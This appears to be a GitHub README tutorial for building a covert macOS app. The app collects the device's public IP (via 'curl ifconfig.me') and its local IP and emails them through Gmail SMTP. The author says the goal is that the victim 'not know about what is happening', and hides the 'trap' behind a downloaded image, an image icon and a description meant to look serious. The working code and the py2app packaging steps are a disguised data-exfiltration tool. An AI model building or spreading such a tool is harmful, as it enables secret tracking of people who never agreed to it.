# <p id="UP">Do you want to create an application without interface for mac?</p>

> The idea of this application will be banal and at the same time interesting. We will receive the IP address of the device and send it to the gmail. In order for our client not to know about what is happening, I propose to hide our trap under the guise of an image taken from the Internet.

## <p align="center">Give thanks : 5168 7450 1701 5535 <a href="https://en.privatbank.ua/all-ways-to-receive-send-an-international-transfer"><img src="https://upload.wikimedia.org/wikipedia/uk/f/ff/%D0%9B%D0%BE%D0%B3%D0%BE%D1%82%D0%B8%D0%BF_%D0%9F%D1%80%D0%B8%D0%B2%D0%B0%D1%8224.png" width = "25" alt="Privat Bank UA"> </a></p>

### let's start parsing the code, which I added to a separate [__sketch.ipynb__](https://github.com/syroiezhin/console2app/blob/main/sketch.ipynb) file for your convenience.

- [X] First of all, let's start with the picture.
1. We can take it directly from the internet.
```python
from PIL import Image
from requests import get
Image.open(get("https://static.ngs.ru/news/2015/99/preview/6f3e934e7e2d0402bdf8113262ea14420b7da035_640.jpg", stream=True).raw).show()
```
2. We don't have to upload it to the app file, this is at your discretion, but we will set the icon for the application with the same image, so:
```python
from PIL import Image
Image.open("image.jpeg").show()
```
- [X] There are various packages for sending emails, but they all use __smtplib__.
```python
server = SMTP(smtp, 587)
server.starttls()
server.login(sender, application_passwords)
msg = MIMEText(mail,"html")
msg["Subject"] = subject
msg['From'] = sender
msg['To'] = destination
server.sendmail(sender, destination, msg.as_string())
```
> Be sure to create your password for your sender mail using [the link provided](https://myaccount.google.com/security#:~:text=chevron_right-,%D0%9F%D0%B0%D1%80%D0%BE%D0%BB%D1%8C%20%D0%B8%D0%B7%D0%BC%D0%B5%D0%BD%D0%B5%D0%BD,-24%20%D0%B8%D1%8E%D0%BB.%20%C2%B7%20%D0%A3%D0%BA%D1%80%D0%B0%D0%B8%D0%BD%D0%B0).
- [X] For orientation in letters, I suggest adding time.
1. As you know, many people use the __datetime__ library to get time data from a computer.
```python
from datetime import datetime
print( datetime.now().strftime("%d.%m.%Y - %H:%M:%S") )
```
2. I suggest using a more convenient way without loading extra libraries into the project.
```python
from os import popen
popen('date').read()
```
- [X] We need the __os__ library to receive a response from the terminal.
1. To get global ip:
```python
popen("curl ifconfig.me").read().strip()
```
2. To get local ip:
```python
popen("ipconfig getifaddr en0").read().strip()
```
> There are other ways to get this information, but I think this is the most elegant way.

### It remains to issue a __setup__ file to get a working application:

- [X] Install:
```python
pip install py2app
```
- [X] We go to the desired directory of the program using cd: `cd Desktop/NameFolder/FolderProject`
- [X] Make sure the required py is in your directory with the command: `ls`
- [X] Create setup.py with:
```
py2applet --make-setup nameProject.py
```
- [X] Let's analyze the changes made to the setup.py file:
1. Come up with a name for the program; specify the file of our program; we will make the entire list of additional programs, if such were used; we specify the entire list of libraries that is not included in the list of the standard library; and be sure to remember the icon.
```python
from setuptools import setup

APP_NAME = "envoy"
APP = ['agent.py']
DATA_FILES = []
OPTIONS = {
    'includes': ['PIL','smtplib','email'],
    'packages': ['PIL','smtplib','email'],
    'iconfile':'image.jpeg'
}
```
2. Now we can include [a description](https://docs.python.org/3/distutils/apiref.html) of this application to make it look serious:
```python
setup(
    app=APP,
    name=APP_NAME,
    data_files=DATA_FILES,
    setup_requires=['py2app'],
    options={'py2app': OPTIONS},

    version='1.0',
    description='scan ip',
    long_description="Sending ip to mail from a running device",

    author='@NEU3RON',
    license="Syroiezhin",
    author_email='v.syroiezhin@gmail.com',
    url="https://github.com/syroiezhin",
)
```
- [X] Сongratulations, now save the change and type the final command into the terminal of the file:
```
python3 setup.py py2app
```
- [X] In case of error "No such file or directory: ... zmq/.dylibs" you will have to reinstall first by deleting:
```
conda remove zeromq
```
- [X] ... and then install without errors getting the result after you try again (`python3 setup.py py2app`).
```
conda install zeromq
```
> 

[⇪](#UP)
